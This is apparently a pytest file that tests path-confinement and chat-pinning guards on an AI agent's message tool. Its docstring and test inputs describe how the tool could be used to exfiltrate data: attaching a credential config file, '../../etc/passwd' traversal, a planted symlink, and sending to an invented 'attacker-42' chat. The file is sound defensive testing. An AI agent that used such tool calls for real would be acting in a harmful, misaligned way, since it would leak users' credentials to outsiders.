"""Tests for the ``message`` tool's exfiltration guards.

The tool used to accept any absolute path in ``media`` and any ``chat_id``,
with no validation. Combined that is a complete exfiltration primitive:
``message(content="hi", media=["~/.markbot/config.json"],
chat_id="attacker-42")`` sent the plaintext credential file to a chat the
model invented. These tests pin both halves of the fix.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from markbot.tools.message import MessageTool
from markbot.types.permission import PermissionMode, ToolPermissionContext
from markbot.types.tool import ToolContext


def _ctx(workspace: Path, chat_id: str = "me") -> ToolContext:
    return ToolContext(
        session_id="s",
        workspace=str(workspace),
        permission_mode=PermissionMode.DEFAULT,
        tool_permission_context=ToolPermissionContext(mode=PermissionMode.DEFAULT),
        channel="feishu",
        chat_id=chat_id,
    )


@pytest.fixture
def sent():
    return []


@pytest.fixture
def tool(sent):
    async def _cb(msg):
        sent.append(msg)

    return MessageTool(send_callback=_cb)


@pytest.fixture
def workspace(tmp_path):
    (tmp_path / "report.txt").write_text("ok", encoding="utf-8")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "chart.png").write_bytes(b"\x89PNG")
    return tmp_path


class TestAttachmentConfinement:
    async def test_relative_path_inside_workspace_allowed(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi", "media": ["report.txt"]}, _ctx(workspace))
        assert "Message sent" in out
        assert len(sent) == 1
        assert sent[0].media == [str((workspace / "report.txt").resolve())]

    async def test_nested_path_inside_workspace_allowed(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi", "media": ["sub/chart.png"]}, _ctx(workspace))
        assert "Message sent" in out
        assert sent[0].media[0].endswith("chart.png")

    async def test_absolute_path_outside_workspace_refused(self, tool, workspace, sent):
        secret = Path.home() / ".markbot" / "config.json"
        out = await tool.execute(
            {"content": "hi", "media": [str(secret)]}, _ctx(workspace)
        )
        assert "refusing to attach" in out
        assert "outside the allowed directories" in out
        assert sent == []

    async def test_traversal_out_of_workspace_refused(self, tool, workspace, sent):
        out = await tool.execute(
            {"content": "hi", "media": ["../../etc/passwd"]}, _ctx(workspace)
        )
        assert "Error" in out
        assert sent == []

    async def test_symlink_pointing_outside_refused(self, tool, workspace, sent):
        """A link planted inside the workspace must not become a read primitive."""
        link = workspace / "innocent.txt"
        target = Path.home() / ".markbot" / "config.json"
        if not target.exists():
            pytest.skip("no config file to link to")
        try:
            os.symlink(target, link)
        except OSError:
            pytest.skip("symlinks unavailable")

        out = await tool.execute({"content": "hi", "media": ["innocent.txt"]}, _ctx(workspace))
        assert "outside the allowed directories" in out
        assert sent == []

    async def test_missing_file_refused(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi", "media": ["nope.txt"]}, _ctx(workspace))
        assert "not found" in out
        assert sent == []

    async def test_directory_refused(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi", "media": ["sub"]}, _ctx(workspace))
        assert "not a file" in out
        assert sent == []

    async def test_too_many_attachments_refused(self, tool, workspace, sent):
        media = ["report.txt"] * (MessageTool._MAX_MEDIA_FILES + 1)
        out = await tool.execute({"content": "hi", "media": media}, _ctx(workspace))
        assert "too many attachments" in out
        assert sent == []

    async def test_configured_extra_root_allowed(self, workspace, tmp_path_factory, sent):
        extra = tmp_path_factory.mktemp("outbox")
        (extra / "export.csv").write_text("a,b\n", encoding="utf-8")

        async def _cb(msg):
            sent.append(msg)

        tool = MessageTool(send_callback=_cb, allowed_media_roots=[str(extra)])
        out = await tool.execute(
            {"content": "hi", "media": [str(extra / "export.csv")]}, _ctx(workspace)
        )
        assert "Message sent" in out

    async def test_no_workspace_and_no_roots_refuses_attachments(self, sent):
        async def _cb(msg):
            sent.append(msg)

        tool = MessageTool(send_callback=_cb)
        ctx = ToolContext(
            session_id="s",
            workspace="",
            permission_mode=PermissionMode.DEFAULT,
            tool_permission_context=ToolPermissionContext(mode=PermissionMode.DEFAULT),
            channel="feishu",
            chat_id="me",
        )
        out = await tool.execute({"content": "hi", "media": ["/etc/passwd"]}, ctx)
        assert "no allowed media root" in out
        assert sent == []


class TestChatTargetPinning:
    async def test_current_chat_allowed(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi", "chat_id": "me"}, _ctx(workspace, "me"))
        assert "Message sent" in out

    async def test_other_chat_refused(self, tool, workspace, sent):
        out = await tool.execute(
            {"content": "hi", "chat_id": "attacker-42"}, _ctx(workspace, "me")
        )
        assert "refusing to send to chat" in out
        assert sent == []

    async def test_omitted_chat_id_uses_the_conversation(self, tool, workspace, sent):
        out = await tool.execute({"content": "hi"}, _ctx(workspace, "me"))
        assert "Message sent" in out
        assert sent[0].chat_id == "me"

    async def test_allowlisted_chat_permitted(self, workspace, sent):
        async def _cb(msg):
            sent.append(msg)

        tool = MessageTool(send_callback=_cb, allowed_chat_ids=["ops-room"])
        out = await tool.execute(
            {"content": "hi", "chat_id": "ops-room"}, _ctx(workspace, "me")
        )
        assert "Message sent" in out

    async def test_cross_chat_escape_hatch_is_explicit(self, workspace, sent):
        async def _cb(msg):
            sent.append(msg)

        tool = MessageTool(send_callback=_cb, allow_cross_chat=True)
        out = await tool.execute(
            {"content": "hi", "chat_id": "anywhere"}, _ctx(workspace, "me")
        )
        assert "Message sent" in out


class TestDefaultConfigIsRestrictive:
    def test_schema_defaults_block_both_paths(self):
        from markbot.config.schema import Config

        cfg = Config().tools.message
        assert cfg.allowed_media_roots == []
        assert cfg.allowed_chat_ids == []
        assert cfg.allow_cross_chat is False

    def test_tool_binder_passes_the_config_through(self):
        """The guards are pointless if the binder never hands them over."""
        from markbot.agent.tool_binder import ToolBinder
        from markbot.tools.registry import ToolRegistry

        from types import SimpleNamespace

        registry = ToolRegistry()
        binder = ToolBinder(
            registry,
            workspace=Path("/tmp"),
            message_config=SimpleNamespace(
                allowed_media_roots=["/tmp/outbox"],
                allowed_chat_ids=["ops-room"],
                allow_cross_chat=False,
            ),
        )
        binder._register_agent_tools()
        tool = registry.get("message")
        assert tool is not None
        assert tool._allowed_media_roots == ["/tmp/outbox"]
        assert tool._allowed_chat_ids == {"ops-room"}
        assert tool._allow_cross_chat is False
